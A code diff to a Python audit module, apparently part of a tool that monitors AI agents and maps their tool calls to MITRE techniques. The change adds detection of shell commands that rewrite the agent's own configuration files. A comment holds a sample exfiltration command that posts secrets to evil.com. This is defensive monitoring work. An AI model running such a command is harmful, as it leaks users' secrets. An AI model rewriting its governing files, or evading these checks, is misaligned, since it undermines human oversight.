@@ -152,7 +152,6 @@ from agentmetry.core.audit.detection.traits import (  # noqa: E402
     CREDENTIAL_ENV,
     CREDENTIAL_ENV_DUMP,
     CREDENTIAL_PATH,
-    SELF_CONFIG_PATH,
     ENV_FILE,
     ENV_FILE_SENT,
     INTERPRETER_NETWORK,
@@ -169,7 +168,9 @@ from agentmetry.core.audit.detection.traits import (  # noqa: E402
     mask_prose_flags,
     env_dump_view,
     mask_literals,
+    shell_writes_self_config,
     tool_kind,
+    write_targets_self_config,
 )
 
 # Shell-wrapped network egress. `bash: curl -d @secrets https://evil.com` is a
@@ -278,17 +279,11 @@ def get_mitre_mapping(
 
     # The tool decides which upgrades its evidence can earn, exactly as in
     # traits.classify_tool_call, so the two classifiers cannot disagree (#40).
-    # A write or a listing earns none: the evidence is a path or file content,
-    # and writing `.env` is not reading it (#329, shapes 4 and 5). A read earns
-    # the credential upgrades from its path, never C2.
+    # A write can identify a config destination. It does not earn upgrades
+    # for executing the content or reading the target (#329). A read earns the
+    # credential upgrades from its path, never C2.
     kind = tool_kind(tool_qualified)
-    if kind == "write" and text and SELF_CONFIG_PATH.search(_path_evidence_text(evidence, text)):
-        # The one write that earns an upgrade. Blanketing writes out above
-        # exists so a write is not upgraded to a *read* technique — writing
-        # `.env` is not reading it. This is not a read technique: the write
-        # itself is the act, an agent rewriting the files that govern it
-        # (#317). The same judgement traits.classify_tool_call makes with
-        # its `edits_self_config` trait, so the two cannot disagree (#40).
+    if kind == "write" and write_targets_self_config(tool_qualified, evidence):
         return _SELF_CONFIG
     if kind in ("write", "list"):
         text = ""
@@ -303,8 +298,11 @@ def get_mitre_mapping(
         shell = _shell_text(evidence)
         lang_net = False
         if shell:
+            shell_words = mask_literals(shell)
+            if kind == "command" and shell_writes_self_config(shell, shell_words):
+                return _SELF_CONFIG
             literal = mask_literals(shell, include_double=False).lower()
-            written = mask_literals(shell).lower()
+            written = shell_words.lower()
             # A python/node heredoc is masked above (it is not shell). Its body
             # is still the program (#345). Append it so a credential path in
             # the body upgrades the technique the same way the trait does.
@@ -319,8 +317,11 @@ def get_mitre_mapping(
             # trait classifier reads it; the mapper has to as well, or a
             # credential inside the payload is a trait with no T1552 (#40).
             for payload in inline_decoded_commands(shell):
+                payload_words = mask_literals(payload)
+                if kind == "command" and shell_writes_self_config(payload, payload_words):
+                    return _SELF_CONFIG
                 literal += "\n" + mask_literals(payload, include_double=False).lower()
-                written += "\n" + mask_literals(payload).lower()
+                written += "\n" + payload_words.lower()
                 text += "\n" + payload.lower()
         else:
             # Structured args, so there is no shell quoting to mask. Path rules
